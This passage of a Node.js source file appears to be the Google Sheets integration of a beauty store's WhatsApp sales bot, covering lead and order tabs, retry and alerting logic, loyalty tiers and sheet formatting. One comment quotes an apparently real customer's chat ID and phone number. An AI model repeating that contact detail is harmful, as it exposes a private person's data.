const fs = require('fs');
const path = require('path');
const { google } = require('googleapis');
const config = require('../config');
const logger = require('../utils/logger');
const { runLimited } = require('../utils/concurrencyLimiter');
const { retryAsync, isTransientError } = require('../utils/retry');
const emailAlert = require('../utils/emailAlert');

// 2026-07-28 audit: appendLead runs 2-3 sequential Sheets API calls per
// customer message (read existing row state, update/append the row, write
// the conversation-history note) with no cap and no retry. Under the same
// message-burst incident that hit OpenAI/Gemini (see concurrencyLimiter.js),
// these calls failed repeatedly ("Failed to write row to Google Sheet") and
// were silently swallowed — real leads were lost, not just delayed. This
// wraps each Sheets call with a bounded retry on transient failures, and
// caps how many concurrent appendLead operations run at once.
//
// 2026-08-07 root-cause audit of the ~910-line error spike this period: 907
// of those lines were "getaddrinfo EAI_AGAIN" against sheets.googleapis.com/
// www.googleapis.com — a transient DNS blip on the host, not the credentials
// (a live token+API check during this audit succeeded immediately) or API
// quota (zero 429/quota-exceeded lines in the whole log). The old 2-retry/
// 500ms budget (~1.5s total) was too short to survive most of these blips;
// widened to 3 retries/750ms (~5.6s total worst case) so a several-second DNS
// hiccup gets absorbed instead of surfacing as a logged failure on every
// independent Sheets operation polling at the time.
// 2026-08-19 audit fix — every individual poller (campaign tick, test-trigger
// check, Bot Paused/Blocked refresh, Send Invoice Action check, order-
// confirmation check, stalled-order escalation, ...) already logs its own
// WARN/ERROR on a Sheets failure, which is correct for that poller's own
// retry-next-tick behavior but gives no aggregate signal — a real Sheets
// outage cascades across a dozen of them at once (confirmed live: two
// distinct multi-hour clusters this past week, ~1,440 error-log lines on the
// worst day, self-healing before the 30-minute total-silence threshold below
// ever tripped, since at least one poller usually still got a call through).
// recordSheetsCallFailure below tracks failures from every sheetsCall
// invocation, across every caller, in one shared sliding window, and fires a
// SINGLE aggregated alert when they cluster — independent of and
// complementary to checkStaleness' "nothing succeeded in 30 minutes" check
// further down, which only catches TOTAL outages, not a bad-reliability
// period with some calls still getting through.
const SHEETS_FAILURE_WINDOW_MS = 5 * 60 * 1000;
const SHEETS_FAILURE_ALERT_THRESHOLD = 5;
let recentSheetsCallFailures = [];

function recordSheetsCallFailure(err) {
  const now = Date.now();
  recentSheetsCallFailures.push(now);
  recentSheetsCallFailures = recentSheetsCallFailures.filter((ts) => now - ts <= SHEETS_FAILURE_WINDOW_MS);
  if (recentSheetsCallFailures.length < SHEETS_FAILURE_ALERT_THRESHOLD) return;
  const windowMinutes = Math.round(SHEETS_FAILURE_WINDOW_MS / 60000);
  // emailAlert.sendAlert's own 15-minute per-alertType cooldown (see that
  // file) is what actually prevents spam during a sustained outage — this
  // can safely call it on every failure past the threshold without adding a
  // second cooldown of its own, and a fresh email will still go out if the
  // outage is still ongoing 15 minutes later.
  emailAlert.sendAlert('google_sheets_repeated_failures', {
    subject: '⚠️ Beauty Hub Bot — Google Sheets: repeated failures across multiple operations',
    text:
      `${recentSheetsCallFailures.length} separate Google Sheets API calls have failed within the last ${windowMinutes} minutes, ` +
      `across whichever pollers/features happened to be running (campaign sends, order-pipeline checks, product refresh, etc. — this ` +
      `alert doesn't distinguish which). Each individual failure is already being retried on its own normal schedule, so no customer-facing ` +
      `action is needed immediately, but this pattern matches a real Sheets-side connectivity issue rather than one-off blips. ` +
      `Last error: ${err && err.message ? err.message : err}`,
  });
}

function sheetsCall(fn) {
  return retryAsync(fn, { retries: 3, baseDelayMs: 750, isRetryable: isTransientError }).catch((err) => {
    recordSheetsCallFailure(err);
    throw err;
  });
}

const LEADS_SHEET_NAME = 'Leads';
const PRODUCTS_SHEET_NAME = 'Products';
// Separate, append-only tab — never upserted-per-phone like Leads is. Leads
// holds one row per customer reflecting their CURRENT state (overwritten on
// every message), so it can't answer "what did this person buy over time" —
// this tab is one row per completed order specifically so that question has
// a real answer. Backs getCustomerHistory()/logOrderHistory() below, which
// power the "Customer Memory & Feedback Retargeting" feature in llmAgent.js.
const ORDER_HISTORY_SHEET_NAME = 'Order History';
const LOCAL_PRODUCTS_PATH = path.join(__dirname, '..', '..', 'products.json');

// Column layout, current as of 2026-07-16 (verified live after every
// structural change below — see HISTORY): A Date, B Customer Name, C
// Customer WhatsApp Number, D Alternative Phone (physically adjacent to the
// primary phone column, per explicit request), E Product Name, F Customer
// Need, G Delivery Address (physically directly before Order Status, per
// explicit request), H Order Status, I Notes, J Conversation History
// (bot-owned: indicator value + full history in the cell Note), K Follow-up
// Date (staff-owned manual column, round-tripped unchanged by appendLead).
//
// HISTORY: this tab has been physically restructured three times now — (1)
// the store owner deleted a "human interaction" column directly in the
// Sheet UI, shifting everything after it left by one; the code wasn't
// updated in step, which silently corrupted the Follow-up Date column for a
// window (see git history); (2) 2026-07-16, moved Alternative Phone next to
// the phone column and Delivery Address before Order Status via two
// explicit moveDimension calls; (3) same day, deleted Customer Message
// entirely (its content is still captured per-message in the Conversation
// History note via buildHistoryEntries — only the standalone column was
// redundant). (2) and (3) both happened live with the bot still running on
// stale code for a few minutes before this file caught up, which produced
// one garbled row (repaired manually afterward). If this tab's layout ever
// looks wrong again, verify the LIVE header row first — don't trust this
// comment or any code constant, and stop the beauty-hub-bot PM2 process
// before making further structural changes to the sheet, not after.
const LEADS_HEADERS = [
  'Date',
  'Customer Name',
  'Customer WhatsApp Number',
  'Alternative Phone',
  'Product Name',
  'Customer Need',
  'Delivery Address',
  'Order Status',
  'Notes',
  'Conversation History',
  'Follow-up Date',
  // 2026-08-03 P1 addition — appended at the end (not inserted next to
  // "Notes") deliberately: this tab still uses fixed-position row[N]
  // destructuring (see appendLead/getExistingRowState below), so inserting a
  // column in the middle would shift every column after it, exactly the
  // historical bug described in the HISTORY note above. Purely staff-owned
  // and round-tripped unchanged by appendLead, same as Follow-up Date — the
  // bot never writes to this column. Exists because the bot-owned "Notes"
  // column (I) gets overwritten by the bot's own next write for that
  // customer, so it can never hold a durable staff annotation.
  'Staff Notes',
];

// Order Status values the bot itself ever writes as a deliberate, specific
// event (order confirmed, cancelled, escalated, etc. — see agent.js/
// llmAgent.js). Deliberately NOT the same list as formatLeadsSheet.js's
// staff-facing dropdown (which also includes staff-only values like
// "Delivered"/"Out for Delivery" the bot never sets itself) — this set is
// just the ones resolveEarlyStageOrderStatus's generic recompute (below)
// needs to be careful not to regress.
const GENERIC_ORDER_STATUSES = new Set(['Pending', 'In Progress']);

// 2026-07-18: "Skin Type"/"Hair Type" merged into a single "Skin/Hair Type"
// column (see the one-time Sheet migration this shipped alongside) — only
// affects ensureHeaderRow's backfill-if-shorter behavior for a brand-new
// sheet; it does not rename an already-existing header row (see
// ensureHeaderRow below), so this has no effect on the already-migrated
// production/sandbox sheets.
const PRODUCTS_HEADERS = [
  'ID',
  'Name',
  'Category',
  'Price',
  'Description',
  'Benefits',
  'Skin/Hair Type',
  'In Stock',
];

const ORDER_HISTORY_HEADERS = ['Date', 'Customer Name', 'Phone', 'Product Name', 'Price', 'Order Status'];

// --- CRM/campaign tracker (2026-07-30) — separate, additive tabs for the
// re-engagement campaign built that day. Never replaces Leads/Order History
// (those stay the system of record for the live bot's normal flow); this is
// a filtered, campaign-specific view on top. See campaignWorker.js for the
// worker that reads/writes these.
const TARGETED_CLIENTS_SHEET_NAME = 'Targeted_Clients';
const OFFERS_CAMPAIGN_SHEET_NAME = 'Offers_Campaign';
const CONFIRMED_ORDERS_SHEET_NAME = 'Confirmed_Orders';
// 2026-08-09 order-management pipeline — one row per delivered order's
// rating/comment, written by feedbackRatingDetector.js's handler in
// llmAgent.js once a customer replies with a recognizable 1-5 rating to the
// automated delivery+rating-request message (see orderPipeline.js).
const FEEDBACK_SHEET_NAME = 'Feedback';
// 2026-08-10: a customer loyalty / lifetime-purchasing tracker —
// orderPipeline.js's runOrderDeliveredCheck upserts one row per phone number
// here every time one of that customer's orders reaches Order
// Status=Delivered. Originally shipped as a full Confirmed_Orders row copy
// (same day) but redesigned, before any real customer had ever been synced
// into it, into this compact accumulating shape per the store owner's
// explicit spec — see upsertTrustedClient/TRUSTED_CLIENTS_HEADERS.
const TRUSTED_CLIENTS_SHEET_NAME = 'Trusted_Clients';
// Order: Customer Name, Phone Number (upsert key), Address (always the
// customer's latest delivered order's address), Total Lifetime Spent and
// Points (both accumulate across every delivered order — 1 EGP spent = 1
// point, per the store owner's explicit spec), Number of Purchases
// (increments by 1 per delivered order). Deliberately NOT the same shape as
// CONFIRMED_ORDERS_HEADERS (that was the original, since-replaced design) —
// this tab answers "how much has this customer bought from us, ever?", not
// "what did their most recent order look like?" (that's still
// Confirmed_Orders' job).
//
// 2026-08-10, same day, 2nd addition: Last Order Date (the Confirmed_Orders
// row's own order date, same value already stored in that tab's "Date"
// column — not a separate "when it was marked Delivered" timestamp, which
// this codebase has no reliable source for) and Customer Tier (auto-computed
// from Number of Purchases — see computeCustomerTier — never staff-typed, so
// it can never drift out of sync with the purchase count it's derived from).
// Appended as trailing columns rather than inserted earlier so this stays a
// pure column-ADDITION migration (see ensureTrustedClientsSchema) — safe to
// apply even if real customer rows already exist under the 6-column shape.
const TRUSTED_CLIENTS_HEADERS = [
  'Customer Name',
  'Phone Number',
  'Address',
  'Total Lifetime Spent',
  'Points',
  'Number of Purchases',
  'Last Order Date',
  'Customer Tier',
];
// 1 EGP of a delivered order's total (including shipping) = 1 loyalty point.
// A named constant rather than a bare `1` multiply so a future "2x points
// weekend" type promotion has one obvious place to change, per the store
// owner's own phrasing ("1 EGP spent = 1 Point").
const LOYALTY_POINTS_PER_EGP = 1;

// Auto-computed from Number of Purchases, never staff-typed — see the header
// note above TRUSTED_CLIENTS_HEADERS. Thresholds are the store owner's exact
// spec: 1-2 -> Bronze, 3-5 -> Silver, 6+ -> VIP Gold.
function computeCustomerTier(numberOfPurchases) {
  if (numberOfPurchases >= 6) return 'VIP Gold 🥇';
  if (numberOfPurchases >= 3) return 'Silver 🥈';
  return 'Bronze 🥉';
}

// Chat ID (column B) is the real send target — WhatsApp addressing needs the
// @lid/@c.us id, not the human-readable phone in column A, which can fail to
// resolve for privacy-mode contacts (see resolveRealPhone in whatsapp/client.js).
const TARGETED_CLIENTS_HEADERS = [
  'Phone Number',
  'Chat ID',
  'Customer Name',
  'Last Interested Category/Product',
  'Campaign Status', // ON_HOLD | PENDING | OFFER_SENT | REPLIED | ORDERED | DECLINED | NEEDS_HUMAN_REVIEW
  'Lead Source',
  'Recency Tier (Days)',
  'Campaign Touches',
  'Objection/Decline Reason',
  'Opt-Out',
  'Last Message Date',
  'Sent At',
  'Replied At',
  'Ordered At',
  // Which of Offers_Campaign's (up to 5) offer rows this contact actually
  // received — added 2026-08-02 when the campaign moved from one single
  // offer to a multi-offer table. Blank for rows created/sent before that.
  'Offer Sent',
  // --- 2026-08-03 P1 sheet-control additions ---
  // Per-contact kill switch for the bot's main reply flow (checked in
  // whatsapp/client.js, same priority tier as the human-handoff cooldown and
  // the global "وقف البوت" pause) — closes the gap the 2026-08-03 audit
  // flagged: the only prior way to silence the bot for one specific customer
  // was the global pause (every customer) or the automatic, non-owner-
  // triggerable human-handoff cooldown. Plain TRUE/FALSE text, same
  // convention as Opt-Out (not a Sheets checkbox — nothing else in this tab
  // uses one, and staff already know the TRUE/FALSE convention from Opt-Out).
  'Bot Paused (this contact)',
  // Ad-hoc "send the campaign's active offer to this row right now" trigger,
  // polled by campaignWorker.js alongside its normal 6-min tick — the only
  // prior way to message one arbitrary contact was a token-gated curl to
  // POST /admin/send-message. Reset to FALSE automatically after the send is
  // attempted (success or failure — see runSendNowCheck for why).
  'Send Now',
  // Hard blocklist, checked in whatsapp/client.js before ANY processing of an
  // inbound message from this chatId (before even auto-capture/logging) —
  // stronger than "Bot Paused" above, which still logs/captures the contact
  // normally and only silences the bot's own reply. Meant for spam/abusive
  // numbers the owner wants the bot to fully ignore, not customers being
  // handled manually for now.
  'Blocked',
];

const CONFIRMED_ORDERS_HEADERS = [
  'Date',
  'Customer Name',
  'Phone',
  'Address',
  'Products',
  'Total Price',
  'Invoice Link',
  'Print Invoice',
  // --- 2026-08-09 order-management pipeline additions (see orderPipeline.js) ---
  // Staff-triggered (re)send of the invoice link. Dropdown is ['Send
  // Invoice', 'Sent', 'Resend'] — Sheets' ONE_OF_LIST validation always
  // allows a blank cell regardless of the list, so a brand-new row (blank)
  // still reads as "not sent yet". Staff picks 'Send Invoice' (or 'Resend'
  // once it already reads 'Sent') to trigger orderPipeline.js; on a
  // confirmed successful send it's written to 'Sent' (left as
  // 'Send Invoice'/'Resend' on failure so the next poll retries it) — see
  // markInvoiceSent, which also flips the adjacent Confirmation Status to
  // 'Pending' unless it's already resolved (see below).
  'Send Invoice Action',
  // Defaults to 'Hold' on every NEW row (initializeOrderPipelineColumns) —
  // never backfilled onto pre-existing rows. orderPipeline.js sends a
  // confirm-your-order+invoice-link message once per Hold row, then flips
  // the row itself to 'Pending' (awaiting the customer's reply — see
  // runOrderConfirmationRequestCheck) so the Sheet, not just the local
  // order_pipeline_state.json, shows staff which rows have already been
  // asked. Also flipped Hold/blank -> 'Pending' whenever Send Invoice
  // Action successfully sends/resends the invoice (markInvoiceSent) — that
  // message carries the same "reply تأكيد" confirmation prompt in that case,
  // so a customer replying to a manually (re)sent invoice is understood the
  // same way. Never overwritten once it's 'Confirmed' or 'Rejected'. From
  // Pending, orderConfirmationReplyDetector.js flips to 'Confirmed'
  // (customer replies تأكيد/تمام/confirm) or 'Rejected' (customer replies
  // رفض/لا/الغاء الطلب/etc — see llmAgent.js).
  'Confirmation Status',
  // Defaults to 'Processing' on every NEW row. Processing/In Transit are
  // manual staff-only states with no automation. Delivered triggers
  // orderPipeline.js's combined delivery-confirmation + rating-request
  // message (see feedbackRatingDetector.js / the Feedback tab below) —
  // replaces the old Leads-sheet "Order Status" -> deliveryFollowup.js
  // flow, which is retired. Same header name as a column on the Leads
  // sheet by unfortunate coincidence only — different sheet, different
  // values, tracked independently.
  'Order Status',
  // 2026-08-11 addition, pure column-ADDITION migration (same
  // ensureHeaderRow backfill pattern as TRUSTED_CLIENTS_HEADERS above —
  // safe on an already-populated sheet). Staff-typed EGP number, blank by
  // default. When set, overrides shippingZones.matchShippingZone(address)'s
  // computed fee for THIS order only, everywhere the fee is shown
  // (invoiceGenerator.js) — same "deterministic code computes it, never
  // guessed" grounding as the rest of the shipping system, just sourced
  // from a manual per-order exception instead of the address lookup. A
  // blank cell means "use the normal computed zone fee" (pre-existing
  // behavior, unaffected).
  'Shipping Fee Override',
  // 2026-08-19 addition, same pure column-ADDITION migration pattern as
  // 'Shipping Fee Override' above (ensureHeaderRow backfills it onto an
  // already-populated sheet safely — existing rows just read as blank until
  // touched). Written once, at order-creation time, by appendConfirmedOrder
  // — reflects the customer's actual choice (captured in chat, resolved
  // against the real zone table by llmAgent.js's resolveShippingMethod, so
  // it's never anything other than a real Cairo/Giza express order or a
  // standard one). invoiceGenerator.js and orderPipeline.js's Trusted_Clients
  // loyalty calc both read this back to pick expressFeeEGP vs feeEGP for the
  // real charged total — Shipping Fee Override (above) still takes priority
  // over both when a staff member has set it, same as before this existed.
  // Blank on any pre-existing row (created before this column did) reads as
  // 'Standard' everywhere this is consumed — never treated as express.
  'Shipping Method',
  // 2026-08-19 addition, same pure column-ADDITION migration pattern as the
  // two columns above — confirmed live (chatId 88876412584107@lid, phone
  // 201055990502): a 12-unit order had no structured place to record the
  // quantity at all, so Total Price silently recorded just the single-unit
  // price until a human noticed and hand-corrected the row. Written once, at
  // order-creation time, by appendConfirmedOrder — llmAgent.js's
  // resolveQuantity/computedProductTotal already fold this into Products
  // (e.g. "اسم المنتج × 12") and Total Price directly, so this column is
  // additionally-informative for staff (a distinct, sortable/filterable
  // number) rather than the only place quantity is recorded. Blank on any
  // pre-existing row reads as 1 everywhere this is consumed — never treated
  // as "no quantity"/0.
  'Quantity',
];

const FEEDBACK_HEADERS = ['Date', 'Customer Name', 'Phone', 'Rating', 'Comments'];

// 2026-08-18 — unlisted-product-request logging (owner-requested). When a
// customer asks for a product not in the catalog and then gives its
// name/specs (and optionally a photo) in reply to Sara's new "not available
// right now, but tell me more" line (see llmSystemPrompt.js rule 8 and
// llmAgent.js's awaitingUnlistedProductDetails flag), that gets logged here
// for staff to source/restock from, instead of silently disappearing once
// the conversation moves on.
const UNLISTED_PRODUCT_REQUESTS_SHEET_NAME = 'Unlisted_Product_Requests';
const UNLISTED_PRODUCT_REQUESTS_HEADERS = ['Timestamp', 'Phone Number', 'Customer Name', 'Product Name & Specs', 'Image URL'];

// A row-per-offer table (2026-08-02) — replaced the old single fixed-cell
// control panel (one CAMPAIGN_STATUS/OFFER_TEXT/TEST_TRIGGER for the whole
// tab) so the owner can run up to 5 independent campaigns at once instead of
// one at a time, without adding more sheet tabs. A row's own CAMPAIGN_STATUS
// must be PUSH (not PAUSE) AND a Targeted_Clients row's Campaign Status must
// be PENDING (not ON_HOLD) for that contact to actually get a message; both
// gates default closed. See ensureOffersCampaignSeeded() for the one-time
// migration that preserves whatever campaign was already live under the old
// layout as Offer 1, and getOffersCampaignRows()/campaignWorker.js for how
// this is read/written.
// Product ID (column G, 2026-08-02 audit fix) — grounds an offer's free-text
// OFFER_TEXT marketing copy in a real, priced catalog SKU. Without this, an
// offer describing a product by a marketing name that doesn't exactly match
// the catalog (e.g. "مبرد القدم الكهربائي" in copy vs. "مبرد قدم" in the
// catalog, found 2026-08-02 as the reason a customer's explicit "عايزة عرض
// مبرد القدم" went unrecognized) leaves the agent with no real product to
// ground a reply/price against when a customer references the offer — see
// campaignKnowledge.js (system-prompt grounding) and campaignWorker.js
// (injects the resolved product into the recipient's session so it's always
// a valid candidate on their next turn, same mechanism as
// session.recommendedProduct in llmAgent.js). Optional: an offer with no
// Product ID (or one that doesn't resolve) still sends fine — this is
// additive grounding, not a requirement to run a campaign.
const OFFERS_CAMPAIGN_HEADERS = ['Offer ID', 'Offer Name', 'OFFER_TEXT', 'CAMPAIGN_STATUS', 'TEST_TRIGGER', 'LAST_TEST_SENT_AT', 'Product ID'];
const OFFERS_CAMPAIGN_OFFER_COUNT = 5;
// Worker heartbeat — global, not per-offer, so it lives in a small side
// panel (column I) next to the table rather than as another table column.
const OFFERS_CAMPAIGN_HEARTBEAT_CELL = 'I2';

// Headroom below the header for banding/validation/borders to already cover
// future rows the worker or the owner adds later, without re-running this.
const DATA_TABLE_MAX_ROWS = 1000;

// Shared "styled data table" look for Targeted_Clients/Confirmed_Orders:
// frozen dark header row, light gridlines, alternating row banding (banding
// deliberately starts at row 2 — startRowIndex 1 — so it never fights with
// the header row's own explicit dark styling below it), and auto-fit
// columns. Column-specific formatting (dropdowns, currency, etc.) is added
// by each tab's own function on top of this.
// hasExistingBanding (2026-08-09 fix, found re-running formatConfirmedOrdersTab
// after adding new columns): the Sheets API rejects addBanding outright if a
// banded range already covers the target range ("You cannot add alternating
// background colors to a range that already has alternating background
// colors") — this function's callers all document themselves as "safe to
// re-run anytime", which was never actually true for banding specifically.
// Callers pass this from the same spreadsheets.get() metadata fetch they
// already do to find sheetId, so re-running never throws once a tab has been
// formatted once before.
function dataTableStyleRequests(sheetId, columnCount, hasExistingBanding = false) {
  const fullRange = { sheetId, startRowIndex: 0, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: 0, endColumnIndex: columnCount };
  const headerRange = { sheetId, startRowIndex: 0, endRowIndex: 1, startColumnIndex: 0, endColumnIndex: columnCount };
  const dataRange = { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: 0, endColumnIndex: columnCount };
  const headerColor = { red: 0.16, green: 0.2, blue: 0.26 };

  return [
    { updateSheetProperties: { properties: { sheetId, gridProperties: { frozenRowCount: 1 } }, fields: 'gridProperties.frozenRowCount' } },
    {
      repeatCell: {
        range: headerRange,
        cell: {
          userEnteredFormat: {
            backgroundColor: headerColor,
            textFormat: { bold: true, foregroundColor: { red: 1, green: 1, blue: 1 }, fontSize: 10 },
            verticalAlignment: 'MIDDLE',
            horizontalAlignment: 'CENTER',
            wrapStrategy: 'WRAP',
          },
        },
        fields: 'userEnteredFormat(backgroundColor,textFormat,verticalAlignment,horizontalAlignment,wrapStrategy)',
      },
    },
    {
      updateBorders: {
        range: fullRange,
        top: { style: 'SOLID_MEDIUM', color: { red: 0.2, green: 0.2, blue: 0.2 } },
        bottom: { style: 'SOLID', color: { red: 0.7, green: 0.7, blue: 0.7 } },
        left: { style: 'SOLID_MEDIUM', color: { red: 0.2, green: 0.2, blue: 0.2 } },
        right: { style: 'SOLID_MEDIUM', color: { red: 0.2, green: 0.2, blue: 0.2 } },
        innerHorizontal: { style: 'SOLID', color: { red: 0.88, green: 0.88, blue: 0.88 } },
        innerVertical: { style: 'SOLID', color: { red: 0.88, green: 0.88, blue: 0.88 } },
      },
    },
    ...(hasExistingBanding
      ? []
      : [
          {
            addBanding: {
              bandedRange: {
                range: dataRange,
                rowProperties: {
                  firstBandColor: { red: 1, green: 1, blue: 1 },
                  secondBandColor: { red: 0.95, green: 0.96, blue: 0.98 },
                },
              },
            },
          },
        ]),
    { autoResizeDimensions: { dimensions: { sheetId, dimension: 'COLUMNS', startIndex: 0, endIndex: columnCount } } },
  ];
}

const REQUEST_TIMEOUT_MS = 15 * 1000; // never let a stalled network call block the bot
// Idempotency window for logOrderHistory/appendConfirmedOrder (2026-08-02
// incident: a stale-session bug in llmAgent.js re-triggered the same
// confirmed order 3x within ~2 min — see that fix for the root cause). This
// is a last-line-of-defense check, not the primary fix: there's no real
// order/transaction ID anywhere in this system, so "same order" is
// approximated as (phone, product, price) seen again within this window —
// wide enough to catch a re-triggered turn, narrow enough to never silently
// swallow a genuine second purchase of the same product later the same day.
const ORDER_DEDUP_WINDOW_MS = 10 * 60 * 1000;
const STARTUP_TIMEOUT_MS = 20 * 1000;
const RETRY_INTERVAL_MS = 2 * 60 * 1000; // retry a failed/timed-out setup automatically
const STALE_THRESHOLD_MS = 30 * 60 * 1000; // warn if nothing succeeded in this long
const STALENESS_CHECK_INTERVAL_MS = 5 * 60 * 1000;

let sheetsClient = null;
let enabled = false;
let retryTimer = null;
let lastSuccessAt = null;
let staleWarningLogged = false;
// Numeric sheetId of the Leads tab (distinct from its name) — required by
// batchUpdate's updateCells requests (used to set cell Notes below), which
// address cells via GridRange{sheetId, rowIndex, columnIndex} rather than the
// "SheetName!A1" strings the values.* endpoints take. Resolved once in
// ensureSheetsStructure() at startup.
let leadsSheetId = null;
// phone -> 1-based row number in the Leads sheet. Built once at startup by
// reading the existing sheet, then kept in sync as rows are written, so
// appendLead can upsert (one row per phone) instead of always inserting.
let phoneRowCache = new Map();
// phone -> array of { date (ISO string), timestamp (ms), productName, price },
// most-recent-first. Built once at startup from the Order History tab, then
// kept in sync in-memory as new orders are logged — a per-message lookup
// (getCustomerHistory) is a Map read, never a Sheets API call.
let customerHistoryCache = new Map();

// Called after any successful Sheets operation (setup, lead append, product
// fetch) so /health and the staleness monitor reflect real connectivity, not
// just whether Sheets was configured.
function recordSuccess() {
  lastSuccessAt = Date.now();
  staleWarningLogged = false;
}

function getLastSuccessAt() {
  return lastSuccessAt;
}

function isStale(thresholdMs = STALE_THRESHOLD_MS) {
  if (!enabled) return false; // intentionally disabled isn't "stale"
  if (!lastSuccessAt) return true;
  return Date.now() - lastSuccessAt > thresholdMs;
}

function checkStaleness() {
  if (!enabled || staleWarningLogged) return;
  if (isStale()) {
    staleWarningLogged = true;
    const minutesSince = lastSuccessAt ? Math.round((Date.now() - lastSuccessAt) / 60000) : null;
    const minutesLabel = minutesSince !== null ? `${minutesSince} minutes` : 'a while';
    logger.warn(
      `Google Sheets has not synced successfully in ${minutesLabel} — check network/credentials. The bot continues running normally with the last known data.`
    );
    // staleWarningLogged (reset in recordSuccess) already dedups this to one
    // alert per outage episode, on top of emailAlert's own per-type cooldown.
    emailAlert.sendAlert('google_sheets_stale', {
      subject: '⚠️ Beauty Hub Bot — Google Sheets sync failing consistently',
      text: `Google Sheets has not synced successfully in ${minutesLabel} (threshold: ${STALE_THRESHOLD_MS / 60000} min). Leads/orders/product-catalog data may be stale or not being logged. The WhatsApp bot itself continues running normally — this only affects the Sheets integration.`,
    });
  }
}

function startStalenessMonitor(intervalMs = STALENESS_CHECK_INTERVAL_MS) {
  const timer = setInterval(checkStaleness, intervalMs);
  if (timer.unref) timer.unref();
}

function columnLetter(count) {
  return String.fromCharCode(64 + count); // 9 -> 'I'
}

function withTimeout(promise, ms, label) {
  let timer;
  const timeout = new Promise((_, reject) => {
    timer = setTimeout(() => reject(new Error(`Timed out after ${ms}ms: ${label}`)), ms);
  });
  return Promise.race([promise, timeout]).finally(() => clearTimeout(timer));
}

async function init() {
  if (!config.googleSheetId) {
    logger.warn('GOOGLE_SHEET_ID is not set. Google Sheets logging is disabled. The WhatsApp bot will continue running without it.');
    enabled = false;
    return;
  }

  if (!fs.existsSync(config.credentialsAbsolutePath)) {
    logger.warn(
      `Google credentials file not found at "${config.credentialsAbsolutePath}". Google Sheets logging is disabled. The WhatsApp bot will continue running without it.`
    );
    enabled = false;
    return;
  }

  try {
    const auth = new google.auth.GoogleAuth({
      keyFile: config.credentialsAbsolutePath,
      scopes: ['https://www.googleapis.com/auth/spreadsheets'],
    });
    sheetsClient = google.sheets({ version: 'v4', auth });
    // Set before ensureSheetsStructure() runs (its sub-steps gate on this
    // flag), but success is NOT logged/recorded until that call actually
    // completes without throwing — see the 2026-07-28 audit note on
    // ensureSheetsStructure() for why: this used to fire unconditionally
    // right here, which logged "initialized" even when structure
    // verification failed immediately afterward (confirmed live 2026-07-27:
    // an OK "initialized" log was followed by hours of "Leads sheetId not
    // resolved" warnings with no retry ever scheduled).
    enabled = true;
    await withTimeout(ensureSheetsStructure(), STARTUP_TIMEOUT_MS, 'Google Sheet tab setup');
    recordSuccess();
    stopRetryTimer();
    logger.success('Google Sheets service initialized and verified.');

    // Deliberately separate from ensureSheetsStructure()'s try/catch above,
    // and non-fatal: the CRM/campaign tabs are additive and optional, unlike
    // Leads/Products/Order History which the core bot depends on. A problem
    // here must never take down normal Sheets logging.
    try {
      await withTimeout(ensureCrmTabs(), STARTUP_TIMEOUT_MS, 'CRM tab setup');
    } catch (err) {
      logger.error(
        'Could not verify/create CRM campaign tabs (Targeted_Clients/Offers_Campaign/Confirmed_Orders). Core Sheets logging is unaffected.',
        err
      );
    }
  } catch (err) {
    logger.error(
      `Google Sheets setup did not complete (network issue or slow response). The WhatsApp bot will continue running; Sheets logging is disabled until connectivity recovers — retrying automatically every ${RETRY_INTERVAL_MS / 1000}s.`,
      err
    );
    enabled = false;
    scheduleRetry();
  }
}

function scheduleRetry() {
  if (retryTimer) return;
  retryTimer = setInterval(() => {
    logger.info('Retrying Google Sheets connection...');
    init();
  }, RETRY_INTERVAL_MS);
  if (retryTimer.unref) retryTimer.unref();
}

function stopRetryTimer() {
  if (retryTimer) {
    clearInterval(retryTimer);
    retryTimer = null;
  }
}

async function ensureSheetsStructure() {
  if (!enabled) return;
  try {
    const meta = await sheetsClient.spreadsheets.get(
      { spreadsheetId: config.googleSheetId },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    const existingTitles = (meta.data.sheets || []).map((s) => s.properties.title);

    const requests = [];
    if (!existingTitles.includes(LEADS_SHEET_NAME)) {
      requests.push({ addSheet: { properties: { title: LEADS_SHEET_NAME } } });
    }
    if (!existingTitles.includes(PRODUCTS_SHEET_NAME)) {
      requests.push({ addSheet: { properties: { title: PRODUCTS_SHEET_NAME } } });
    }
    if (!existingTitles.includes(ORDER_HISTORY_SHEET_NAME)) {
      requests.push({ addSheet: { properties: { title: ORDER_HISTORY_SHEET_NAME } } });
    }

    if (requests.length > 0) {
      await sheetsClient.spreadsheets.batchUpdate(
        { spreadsheetId: config.googleSheetId, requestBody: { requests } },
        { timeout: REQUEST_TIMEOUT_MS }
      );
      logger.info(`Created Google Sheet tab(s): ${requests.map((r) => r.addSheet.properties.title).join(', ')}`);
    }

    // Re-fetch only if a tab was just created (the Leads tab's sheetId
    // wouldn't be in the `meta` snapshot taken before that batchUpdate ran) —
    // otherwise reuse `meta` rather than spending an extra API call on every
    // startup.
    const leadsMetaSource = requests.length > 0
      ? (await sheetsClient.spreadsheets.get({ spreadsheetId: config.googleSheetId }, { timeout: REQUEST_TIMEOUT_MS })).data
      : meta.data;
    const leadsSheetMeta = (leadsMetaSource.sheets || []).find((s) => s.properties.title === LEADS_SHEET_NAME);
    if (leadsSheetMeta) leadsSheetId = leadsSheetMeta.properties.sheetId;

    await ensureHeaderRow(LEADS_SHEET_NAME, LEADS_HEADERS);
    await ensureProductsTabSeeded();
    await ensureHeaderRow(ORDER_HISTORY_SHEET_NAME, ORDER_HISTORY_HEADERS);
    await loadPhoneRowCache();
    await loadCustomerHistoryCache();
  } catch (err) {
    // Rethrow (2026-07-28 fix) instead of swallowing: this catch only ever
    // fires for the critical path above (spreadsheets.get/batchUpdate/leadsSheetId
    // resolution) — ensureHeaderRow/loadPhoneRowCache/loadCustomerHistoryCache
    // each already catch their own errors and degrade gracefully without
    // throwing, so they never reach here. Letting this propagate to init()'s
    // catch is what makes recordSuccess()/stopRetryTimer() only fire on real
    // success, and what makes scheduleRetry() actually run instead of never
    // firing. Previously this was swallowed here, which left the bot
    // reporting itself healthy for hours while leadsSheetId stayed
    // unresolved and nothing ever retried.
    logger.error('Could not verify/create Google Sheet tabs.', err);
    throw err;
  }
}

async function ensureHeaderRow(sheetName, headers) {
  if (!enabled) return;
  try {
    const range = `${sheetName}!A1:${columnLetter(headers.length)}1`;
    const result = await sheetsClient.spreadsheets.values.get(
      { spreadsheetId: config.googleSheetId, range },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    // Re-write (not just create) the header whenever it's shorter than the
    // current headers list, so adding a trailing column (e.g. Conversation
